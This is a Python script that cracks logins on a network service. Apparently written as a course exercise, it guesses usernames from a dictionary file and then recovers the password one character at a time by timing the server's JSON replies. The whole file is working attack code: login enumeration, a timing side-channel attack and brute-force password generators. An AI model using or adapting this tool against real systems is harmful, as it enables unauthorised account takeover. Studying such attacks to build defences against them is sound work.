import argparse
import socket
import itertools
import string
import json
import datetime


def main():
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument('hostname', default='127.0.0.1', help='host name or IP address')
    arg_parser.add_argument('port', type=int)
    arg_parser.add_argument('--message', default='', help='message for sending to hostname')
    args = arg_parser.parse_args()

    with socket.socket() as client_socket:
        client_socket.connect((args.hostname, args.port))
        result = 'Wrong login!'
        if args.message:
            client_socket.send(args.message.encode())
            result = get_result_from_server(client_socket)
        if result == 'Wrong login!':
            for login in dictionary_based_brute_force_logins():
                client_socket.send(login_password_to_json(login).encode())
                result = get_result_from_server(client_socket)
                if result != 'Wrong login!':
                    break
        if result != 'Connection success!':
            password = ''
            alphabet = alphabet_for_password()
            while True:
                ch = next(alphabet)
                client_socket.send(login_password_to_json(login, password + ch).encode())
                start_time = datetime.datetime.now()
                result = get_result_from_server(client_socket)
                end_time = datetime.datetime.now()
                if (end_time - start_time).microseconds >= 100000:
                    password += ch
                    alphabet = alphabet_for_password()
                if result == 'Connection success!':
                    password += ch
                    break
        print(login_password_to_json(login, password))


def get_result_from_server(client_socket):
    return json.loads(client_socket.recv(1024).decode())['result']


def login_password_to_json(login='admin', password=''):
    return json.dumps({'login': login, 'password': password})


def alphabet_for_password():
    for ch in itertools.chain(string.ascii_letters, string.digits):
        yield ch


def dictionary_based_brute_force_logins():
    with open('logins.txt') as f:
        for login in f:
            yield login.strip()


def dictionary_based_brute_force_passwords():
    with open('passwords.txt') as f:
        for password in f:
            for combination in itertools.product(*((ch.upper(), ch.lower()) for ch in password.strip())):
                yield ''.join(combination)


def brute_force_passwords(available_characters=string.ascii_lowercase + string.digits):
    for r in range(1, len(available_characters)):
        for combination in itertools.product(available_characters, repeat=r):
            yield ''.join(combination)


if __name__ == '__main__':
    main()
